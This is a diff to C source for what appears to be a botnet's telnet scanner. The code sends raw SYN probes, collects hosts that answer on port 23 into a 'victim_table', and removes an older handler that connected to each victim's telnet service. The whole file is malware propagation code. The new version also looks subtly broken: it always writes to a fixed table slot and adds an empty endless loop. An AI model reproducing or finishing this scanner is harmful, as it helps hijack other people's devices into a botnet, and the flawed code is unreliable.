@@ -13,8 +13,7 @@
 */
 port_t LOCAL_PORT; // Global source port
 ipv4_t LOCAL_ADDR; // Global source port
-
-uint8_t SCAN_CONS = 0;
+struct scan_victim *victim_table;
 
 bool scan_able = true;
 
@@ -66,9 +65,16 @@ static unsigned short csum(unsigned short *ptr, int nbytes)
 bool scan_scanner(void)
 {
 	if (scan_able == false)
-		goto end;
+		_exit(0);
 
 	printd("Initializing Scanner")
+
+	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
+    for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++)
+    {
+        victim_table[i].state = 0;
+        victim_table[i].sock = -1;
+    }
 
 	int32_t sock, i = 1;
 	uint16_t fails = 0;
@@ -208,88 +214,18 @@ bool scan_scanner(void)
 			if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
 			{
 				pktd(riph, rtcph) // Only in debug releases
-				scan_handler(riph->saddr);
+				struct scan_victim *victim;
+
+				victim = &victim_table[1];
+				victim->ip = riph->saddr;
 			}
 		}
 	}
-end:
-	_exit(0);
-}
-
-bool scan_listen(void)
-{
-	int32_t sock, saddr_size, data_size;
-	struct sockaddr saddr;
-	unsigned char *buf = (unsigned char *)calloc(65536, sizeof(unsigned char *));
-
-	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
-		goto end;
-
-	saddr_size = sizeof(saddr);
-
 	while (1)
 	{
-		if ((data_size = recvfrom(sock, buf, 65535, 0, &saddr, (unsigned int *)&saddr_size)) < 0)
-			goto end;
 
-		struct iphdr *iph = (struct iphdr *)buf;
-		unsigned short iphdrlen;
-
-		if (iph->protocol == 6)
-		{
-			iphdrlen = iph->ihl * 4;
-			struct tcphdr *tcph = (struct tcphdr *)(buf + iphdrlen);
-
-			// Check that it is a SYN ACK and if it matches our source port
-			if (tcph->syn == 1 && tcph->ack == 1 && tcph->dest == LOCAL_PORT && tcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
-			{
-				pktd(iph, tcph) // Only in debug releases
-				scan_handler(iph->saddr);
-			}
-		}
 	}
-
 end:
-	free(buf);
-	close(sock);
-	return false;
-}
-
-void scan_handler(ipv4_t ip)
-{
-	int32_t ret;
-
-	if ((ret = fork()) != 0)
-		return;
-
-	while (SCAN_CONS >= SCAN_MAXCONNS)
-		sleep(10); // Wait until we are free to process the client
-
-	telnetinfo_t client;
-	int sock;
-	unsigned char *buf = calloc(1024, sizeof(unsigned char *));
-
-	struct sockaddr_in addr;
-	addr.sin_addr.s_addr = ip;
-	addr.sin_family = AF_INET;
-	addr.sin_port = htons(23); // Set our port
-	memset(addr.sin_zero, '\0', sizeof(addr.sin_zero));
-
-	client.ip = ip;
-	client.user = 0;
-	client.pass = 0;
-	strcpy(client.prompt, "\0");
-
-	sock = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-		goto end;
-
-	if ((read(sock, buf, 1024)) < 0)
-		goto end;
-
-	if ((write(sock, buf, 1024)) < 0)
-		goto end;
-end:;
-	free(buf);
+	free(victim_table);
 	_exit(0);
 }
